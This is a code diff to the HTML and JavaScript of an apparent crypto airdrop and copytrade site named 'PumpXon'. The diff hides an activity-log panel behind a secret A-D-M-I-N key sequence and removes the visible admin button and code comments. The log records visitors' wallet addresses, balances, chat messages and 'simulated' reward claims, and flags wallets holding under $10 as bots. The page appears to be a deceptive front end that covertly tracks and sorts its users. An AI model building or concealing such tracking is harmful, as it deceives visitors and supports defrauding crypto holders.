@@ -45,8 +45,6 @@
         .nav-btn { font-family: 'Arial Black', sans-serif; background: rgba(255, 255, 255, 0.02); border: 1px solid #1a1528; color: #8b859e; padding: 10px 16px; border-radius: 6px; text-transform: uppercase; font-size: 11px; transition: all 0.2s ease; cursor: pointer; }
         .nav-btn:hover { color: #ffffff; border-color: var(--neon-cyan); }
         .nav-btn.active { background: var(--neon-purple); color: #ffffff; border-color: var(--neon-purple); box-shadow: 0 0 15px rgba(157, 78, 221, 0.5); }
-        .nav-btn.admin-btn { border-color: var(--neon-pink); color: var(--neon-pink); }
-        .nav-btn.admin-btn:hover { background: var(--neon-pink); color: #000; }
 
         .app-section { display: none; width: 100%; max-width: 1100px; padding: 20px; box-sizing: border-box; z-index: 1; animation: fadeIn 0.3s ease-in-out; }
         .app-section.active-section { display: block; }
@@ -106,19 +104,24 @@
         .progress-fill { height: 100%; background: var(--neon-cyan); width: 0%; transition: width 0.4s ease; box-shadow: 0 0 10px var(--neon-cyan); }
         .modal-status { font-family: monospace; color: #8b859e; margin-top: 15px; font-size: 12px; text-transform: uppercase; }
 
-        /* ADMIN PANEL */
+        /* HIDDEN ADMIN PANEL - Only visible with secret key combo */
         .admin-panel {
             display: none;
-            background: rgba(9, 7, 15, 0.95);
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: rgba(9, 7, 15, 0.98);
             border: 2px solid var(--neon-pink);
             border-radius: 12px;
-            padding: 20px;
-            margin: 20px auto;
-            max-height: 500px;
+            padding: 25px;
+            max-height: 80vh;
+            width: 90%;
+            max-width: 900px;
             overflow-y: auto;
-            width: 100%;
-            max-width: 1100px;
             box-sizing: border-box;
+            z-index: 10000;
+            box-shadow: 0 0 60px rgba(255, 0, 85, 0.3);
         }
         .admin-panel.active { display: block; }
         .admin-panel::-webkit-scrollbar { width: 6px; }
@@ -149,6 +152,21 @@
             color: #8b859e;
         }
         .admin-stats span { color: var(--neon-cyan); font-weight: bold; }
+        .admin-close {
+            background: rgba(255, 0, 85, 0.2);
+            border: 1px solid var(--neon-pink);
+            color: var(--neon-pink);
+            padding: 4px 12px;
+            border-radius: 4px;
+            font-family: monospace;
+            font-size: 10px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+        .admin-close:hover {
+            background: var(--neon-pink);
+            color: #000;
+        }
         
         .log-entry {
             font-family: monospace;
@@ -176,9 +194,12 @@
         .log-type.swap { background: rgba(57, 255, 20, 0.2); color: var(--neon-green); }
         .log-type.claim { background: rgba(255, 0, 85, 0.2); color: var(--neon-pink); }
         .log-type.bot { background: rgba(255, 0, 0, 0.3); color: #ff4444; }
+        .log-type.system { background: rgba(255, 255, 255, 0.1); color: #888; }
+        .log-type.chat { background: rgba(0, 240, 255, 0.1); color: #66ddff; }
         .log-entry .log-detail { flex: 1; word-break: break-all; }
         .log-entry .log-balance { color: var(--neon-green); font-weight: bold; }
         .log-entry .log-balance.low { color: #ff6644; }
+        .log-entry .log-wallet { color: var(--neon-purple); font-size: 10px; }
         
         .log-clear-btn {
             background: rgba(255, 0, 85, 0.15);
@@ -195,6 +216,18 @@
             background: var(--neon-pink);
             color: #000;
         }
+
+        .admin-overlay {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background: rgba(0, 0, 0, 0.7);
+            z-index: 9999;
+        }
+        .admin-overlay.active { display: block; }
 
         .market-header { margin-bottom: 40px; }
         .market-grid { display: flex; flex-direction: column; gap: 15px; }
@@ -275,6 +308,26 @@
 <body>
     <div class="custom-cursor" id="cursor"></div>
 
+    <!-- Hidden Admin Overlay -->
+    <div id="admin-overlay" class="admin-overlay"></div>
+
+    <!-- Hidden Admin Panel - Only visible with secret combo -->
+    <div id="admin-panel" class="admin-panel">
+        <div class="admin-header">
+            <h3>🔴 LIVE ACTIVITY LOG</h3>
+            <div class="admin-stats">
+                Total Events: <span id="log-count">0</span> &nbsp;|&nbsp;
+                <button class="log-clear-btn" onclick="clearLogs()">CLEAR ALL</button>
+                <button class="admin-close" onclick="closeAdminPanel()">✕ CLOSE</button>
+            </div>
+        </div>
+        <div id="log-container">
+            <div class="log-entry" style="color: #5a5570; text-align: center; justify-content: center;">
+                Waiting for user activity...
+            </div>
+        </div>
+    </div>
+
     <div id="wallet-modal" class="modal-overlay">
         <div class="modal-content" id="modal-box">
             <h3 class="modal-title" id="modal-title">CONNECTING...</h3>
@@ -307,25 +360,8 @@
             <button class="nav-btn" onclick="switchSection('copytrade', this)">Copytrade Hub</button>
             <button class="nav-btn" onclick="switchSection('nodes', this)">Node Validator</button>
             <button class="nav-btn" onclick="switchSection('vault', this)">Rarity Vault</button>
-            <button class="nav-btn admin-btn" onclick="toggleAdminPanel()">📊 Admin</button>
         </nav>
     </header>
-
-    <!-- ADMIN PANEL -->
-    <div id="admin-panel" class="admin-panel">
-        <div class="admin-header">
-            <h3>🔴 LIVE ACTIVITY LOG</h3>
-            <div class="admin-stats">
-                Total Events: <span id="log-count">0</span> &nbsp;|&nbsp;
-                <button class="log-clear-btn" onclick="clearLogs()">CLEAR ALL</button>
-            </div>
-        </div>
-        <div id="log-container">
-            <div class="log-entry" style="color: #5a5570; text-align: center; justify-content: center;">
-                Waiting for user activity...
-            </div>
-        </div>
-    </div>
 
     <section id="airdrop" class="app-section active-section">
         <div class="main-container">
@@ -500,6 +536,64 @@
 
     <script>
         // ============================================================
+        // SECRET ADMIN PANEL - Press 'A' + 'D' + 'M' + 'I' + 'N' 
+        // in sequence to open (case insensitive)
+        // ============================================================
+        let secretKeyPresses = [];
+        const secretCode = ['a', 'd', 'm', 'i', 'n'];
+        let adminPanelOpen = false;
+
+        document.addEventListener('keydown', function(e) {
+            const key = e.key.toLowerCase();
+            
+            // Add to sequence
+            secretKeyPresses.push(key);
+            if (secretKeyPresses.length > secretCode.length) {
+                secretKeyPresses.shift();
+            }
+            
+            // Check if sequence matches
+            let match = true;
+            for (let i = 0; i < secretKeyPresses.length; i++) {
+                if (secretKeyPresses[i] !== secretCode[i]) {
+                    match = false;
+                    break;
+                }
+            }
+            
+            if (match && secretKeyPresses.length === secretCode.length) {
+                e.preventDefault();
+                toggleAdminPanel();
+                secretKeyPresses = []; // Reset after trigger
+            }
+            
+            // Also allow ESC to close
+            if (key === 'escape' && adminPanelOpen) {
+                closeAdminPanel();
+            }
+        });
+
+        function toggleAdminPanel() {
+            const panel = document.getElementById('admin-panel');
+            const overlay = document.getElementById('admin-overlay');
+            panel.classList.toggle('active');
+            overlay.classList.toggle('active');
+            adminPanelOpen = panel.classList.contains('active');
+            if (adminPanelOpen) {
+                addLogEntry('system', 'Admin panel opened');
+                renderLogs();
+            }
+        }
+
+        function closeAdminPanel() {
+            const panel = document.getElementById('admin-panel');
+            const overlay = document.getElementById('admin-overlay');
+            panel.classList.remove('active');
+            overlay.classList.remove('active');
+            adminPanelOpen = false;
+        }
+
+        // ============================================================
         // LOGGING SYSTEM - Tracks all user activity
         // ============================================================
         let activityLogs = [];
@@ -518,14 +612,15 @@
                 wallet: wallet
             };
             
-            activityLogs.unshift(entry); // Newest first
-            if (activityLogs.length > 100) activityLogs.pop(); // Keep last 100
+            activityLogs.unshift(entry);
+            if (activityLogs.length > 200) activityLogs.pop();
             
-            renderLogs();
-            updateLogCount();
+            if (adminPanelOpen) {
+                renderLogs();
+                updateLogCount();
+            }
             
-            // Also log to console for debugging
-            console.log(`[${timeStr}] [${type.toUpperCase()}] ${detail} ${balance ? '| Balance: $' + balance : ''}`);
+            console.log(`[${timeStr}] [${type.toUpperCase()}] ${detail} ${balance !== null ? '| Balance: $' + balance : ''} ${wallet ? '| Wallet: ' + wallet : ''}`);
         }
 
         function renderLogs() {
@@ -536,11 +631,10 @@
             }
             
             container.innerHTML = activityLogs.map(entry => {
-                const balanceClass = entry.balance !== null && entry.balance < 100 ? 'log-balance low' : 'log-balance';
+                const balanceClass = entry.balance !== null && entry.balance < 10 ? 'log-balance low' : 'log-balance';
                 const balanceDisplay = entry.balance !== null ? `| <span class="${balanceClass}">$${entry.balance.toFixed(2)}</span>` : '';
-                const walletDisplay = entry.wallet ? `🔑 ${entry.wallet}` : '';
+                const walletDisplay = entry.wallet ? `<span class="log-wallet">🔑 ${entry.wallet}</span>` : '';
                 
-                // Flag potential bots (balance under $10)
                 const isBot = entry.balance !== null && entry.balance < 10;
                 const typeClass = isBot ? 'bot' : entry.type;
                 const typeDisplay = isBot ? '⚠️ BOT' : entry.type.toUpperCase();
@@ -569,14 +663,6 @@
                 renderLogs();
                 updateLogCount();
                 addLogEntry('system', 'Logs cleared by admin');
-            }
-        }
-
-        function toggleAdminPanel() {
-            const panel = document.getElementById('admin-panel');
-            panel.classList.toggle('active');
-            if (panel.classList.contains('active')) {
-                addLogEntry('system', 'Admin panel opened');
             }
         }
 
@@ -826,7 +912,6 @@
                 return;
             }
             
-            // Log the swap
             const payAmount = document.getElementById('swap-pay-input').value;
             const recvAmount = document.getElementById('swap-recv-input').value;
             const walletAddr = addrInput.value;
@@ -972,7 +1057,6 @@
                 input.value = '';
                 chatBox.scrollTop = chatBox.scrollHeight;
                 
-                // Log chat messages too
                 const addrInput = document.getElementById('address');
                 const wallet = addrInput.value || 'unknown';
                 addLogEntry('chat', `Message: "${msg}"`, null, wallet);
@@ -1024,7 +1108,6 @@
             document.getElementById('swap-pay-bal').innerText = "4.25"; 
             document.getElementById('swap-recv-bal').innerText = "250.00";
             
-            // LOG THE CONNECTION WITH BALANCE
             addLogEntry('wallet', `MetaMask connected`, balance, walletAddr);
         }
         
@@ -1042,7 +1125,6 @@
             document.getElementById('swap-pay-bal').innerText = "56.40"; 
             document.getElementById('swap-recv-bal').innerText = "1,205.50";
             
-            // LOG THE CONNECTION WITH BALANCE
             addLogEntry('wallet', `Phantom connected`, balance, walletAddr);
         }
 
@@ -1058,7 +1140,6 @@
                 return;
             }
             
-            // LOG THE MIRROR ATTEMPT
             const walletAddr = addrInput.value;
             addLogEntry('mirror', `Mirrored trader: ${traderSig || 'unknown'}`, null, walletAddr);
             
@@ -1080,7 +1161,6 @@
             btn.innerText = "VERIFYING LEDGER..."; 
             btn.style.background = "#fff";
             
-            // LOG THE CLAIM
             const walletAddr = addrInput.value;
             addLogEntry('claim', `Claimed rewards (simulated)`, null, walletAddr);
             
@@ -1136,8 +1216,9 @@
         fetchLiveCryptoPrices();
         setInterval(fetchLiveCryptoPrices, 45000);
         
-        // Log system start
         addLogEntry('system', 'PumpXon System initialized');
+        
+        console.log("🔐 ADMIN PANEL: Press 'A' 'D' 'M' 'I' 'N' in sequence to open");
     </script>
 </body>
 </html>
